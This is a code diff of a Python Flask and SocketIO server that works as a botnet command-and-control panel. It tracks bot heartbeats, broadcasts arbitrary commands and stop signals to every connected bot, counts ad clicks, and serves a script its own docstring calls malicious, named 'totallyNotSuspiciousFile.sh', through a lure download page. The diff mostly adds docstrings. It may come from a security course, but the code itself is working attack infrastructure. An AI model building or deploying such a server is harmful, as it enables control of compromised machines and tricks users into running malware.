@@ -11,7 +11,7 @@ app = Flask(__name__)
 cors = CORS(app)
 app.config['CORS_HEADERS'] = 'Content-Type'
 sio = SocketIO(app)
-
+nb_clicks = 0
 botnets = []
 
 
@@ -27,6 +27,10 @@ def disconnect():
 
 @sio.event
 def heartbeat(data):
+    """
+    Get botnets heartbeats and save it
+    """
+
     global botnets
 
     botnet: BotnetActivity = None
@@ -42,31 +46,52 @@ def heartbeat(data):
 
 @app.route('/', methods=["GET"])
 def send_dashboard():
+    """
+    Render the dashboard page to control botnets
+    """
+
     return send_from_directory('static', 'dashboard.html')
+
 
 @app.route('/command', methods=["POST"])
 def send_command():
+    """
+    Receive a JSON command definition and broadcast it to the connected botnets
+    """
+
     emit("command", request.get_json(), namespace="/", broadcast=True)
     return "Done"
 
 
 @app.route('/command/stop', methods=["POST"])
 def send_stop():
+    """
+    Stop running command on every botnets
+    """
+
     emit("stop", request.get_json(), namespace="/", broadcast=True)
     return "Done"
 
 
-nb_clicks = 0
 @app.route('/ad', methods=["GET"])
 def click_ad():
+    """
+    Count clicked link
+    """
+
     global nb_clicks
     nb_clicks += 1
     print("Clicks : ", nb_clicks)
     return str(nb_clicks)
 
+
 @app.route('/botnets', methods=["GET"])
 @cross_origin()
 def get_botnets():
+    """
+    Return botnet list
+    """
+
     global botnets
     botnets = list(filter(lambda b: (time.time_ns() //
                    1_000_000) - b.last_seen < 60_000, botnets))
@@ -75,12 +100,22 @@ def get_botnets():
 
 @app.route('/download', methods=["GET"])
 def myscript():
+    """
+    Download the malicious script
+    """
+
     path = "Shell_script/totallyNotSuspiciousFile.sh"
     return send_file(path)
 
+
 @app.route('/home')
 def home():
+    """
+    Render the download page
+    """
+
     return render_template("page_web.html")
+
 
 if __name__ == '__main__':
     sio.run(app)
